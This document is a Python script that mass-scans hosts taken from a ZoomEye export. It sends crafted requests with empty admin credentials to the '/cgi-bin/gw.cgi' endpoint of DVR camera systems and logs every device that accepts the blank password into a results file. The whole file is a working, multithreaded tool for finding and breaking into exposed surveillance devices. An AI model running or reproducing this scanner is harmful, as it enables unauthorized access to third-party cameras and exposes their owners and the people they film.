#!/usr/bin/python
#-*- coding=utf8 -*-
import sys
import time
import queue
import urllib
import requests
import threading

global i
global port
passwd = ""

class Scanner:
   def __init__(self):
       self.threads_max=10
       self.queue = queue
       self.contral = "true"
       self.threads = []
   def read_url(self):
       with open("ZoomEyes_Raw.txt") as f:
          for line in f.readlines():

            host = line.split(":")
            self.ip = str(host[0])
            self.port = str(host[1])
            self.port = self.port.replace("\n", "")
            #print(self.ip + ":" + self.port)
            self.headers = {
                'Host': self.ip,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',
                'Referer': "http://" + self.ip + "/",
                'Accept': "*/*",
                'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
                'X-Requested-With': 'XMLHttpRequest',
                'Cookie': 'lxc_save=admin%2c' + passwd + ';dvr_camcnt=16;dvr_clientport=' + self.port + ';dvr_sensorcnt=4;dvr_usr=admin;dvr_pwd=' + passwd + ';iSetAble=1;iPlayBack=1',
                'Connection': 'close'
            }
            a = '<juan ver=\"\" squ=\"\" dir=\"0\"><rpermission usr=\"admin\" pwd=\"' + passwd + '\"><config base=\"\"/><playback base=\"\"/></rpermission></juan>'
            b = urllib.parse.quote(a)  # 对a进行URL编码
            ti = int(time.time())  # 获取当前距离元点的时间，整数
            data = "xml=" + b + "&_=" + str(ti)
            self.url = "http://" + self.ip + "/cgi-bin/gw.cgi?" + data  # 提交的url
            if threading.activeCount() >= self.threads_max:
                time.sleep(0.8)
                #print(threading.activeCount())
                #print("sleep")
                ip = self.ip
                url = self.url
                port = self.port
                t = threading.Thread(target=self.req_test, args=(url, ip, port))
                t.start()
            else:
                #print("work")
                ip=self.ip
                url=self.url
                port=self.port
                t = threading.Thread(target=self.req_test,args=(url,ip,port))
                t.start()
            #self.req_test()

   def Mian(self):
       self.read_url()
   def req_test(self,url,ip,port):
          #print("[+]req_test:"+self.ip)
          #print("100")
        try:
          req = requests.get(url, headers=self.headers)
          length = req.headers['Content-Length']
          #print("[+]"+self.ip+":"+self.port+",len:"+length)
          if (length == "175"):              #返回页面length=175,登录成功
              print("[HERE]"+ip +":"+port+ " HaS NULL PasswD")
              try:
                   files = open("Results.txt", "a")
                   data = ip +":"+ port
                   files.write(data)
                   files.write("\n")
                   files.close()
              except:
                   print("[-]打不开文件"+ip + "--" + passwd + "--")
          else:
                 print("[-]"+ip+":"+port)
        except:
            print("[--]"+ip+":"+port)
if (__name__=="__main__"):
   S1=Scanner()
   S1.Mian()
   if not(S1.req_test):
      print("-----------end--------------")



